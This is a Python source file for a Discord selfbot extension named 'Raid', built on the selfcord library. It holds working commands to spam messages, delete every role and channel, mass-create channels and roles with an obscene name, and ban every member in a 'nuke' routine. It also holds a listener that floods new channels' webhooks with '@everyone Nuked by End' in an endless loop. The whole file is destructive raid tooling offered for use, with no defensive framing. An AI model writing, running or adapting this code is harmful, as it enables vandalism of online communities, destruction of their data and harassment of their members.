from selfcord import Extender
import asyncio

class Ext(Extender, name="Raid", description="Raiding related commands"):
    def __init__(self, bot) -> None:
        self.bot = bot
        self.web = False


    @Extender.cmd(description="Spams messages <amount> <message>")
    async def spam(self, ctx, amount: int, *, message: str):
        await ctx.message.delete()
        await ctx.spam(amount, message)

    @Extender.cmd(description="Sets Webhook Spam to True or False")
    async def webhook(self, ctx):
        self.web = True if self.web == False else False
        await ctx.reply(f"Webhook spam is now {self.web}")

    @Extender.cmd(description="Delete all role")
    async def rd(self, ctx):
        await ctx.message.delete()
        for role in ctx.guild.roles:
            try:
                await role.delete()
            except:
                continue

    @Extender.cmd(description="Delete all channel")
    async def cd(self, ctx):
        await ctx.message.delete()
        for i in range(0, len(ctx.guild.channels), 2):
            await asyncio.gather(*(asyncio.create_task(channel.delete()) for channel in ctx.guild.channels[i:i+2]), return_exceptions=True)


    @Extender.cmd(description="Spam channels")
    async def cc(self, ctx):
        await ctx.message.delete()
        await asyncio.gather(*(asyncio.create_task(ctx.guild.txt_channel_create(name="Penis")) for i in range(50)) )

    @Extender.cmd(description="Spam roles")
    async def rc(self, ctx):
        await ctx.message.delete()
        await asyncio.gather(*(asyncio.create_task(ctx.guild.role_create(name="Penis")) for i in range(50)) )

    @Extender.cmd(description="Nuke current server")
    async def nuke(self, ctx):
        await ctx.message.delete()

        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except:
                continue

        await asyncio.gather(*(asyncio.create_task(ctx.guild.txt_channel_create(name="Penis")) for i in range(50)) )

        for role in ctx.guild.roles:
            try:
                await role.delete()
            except:
                continue

        await asyncio.gather(*(asyncio.create_task(ctx.guild.role_create(name="Penis")) for i in range(50)) )

        for member in ctx.guild.members:
            try:
                await ctx.guild.ban(member.id)
            except:
                continue


    @Extender.on("channel_create")
    async def webhook_spam(self, channel):
        if self.web:
            webhook = await channel.create_webhook(name="End")
            while True:
                await asyncio.gather(*(asyncio.create_task(webhook.send("@everyone Nuked by End")) for i in range(3)), return_exceptions=True)

    @Extender.cmd(description="Testing ")
    async def Raid(self, ctx):
        await ctx.message.delete()
        print(self, self.__dict__)


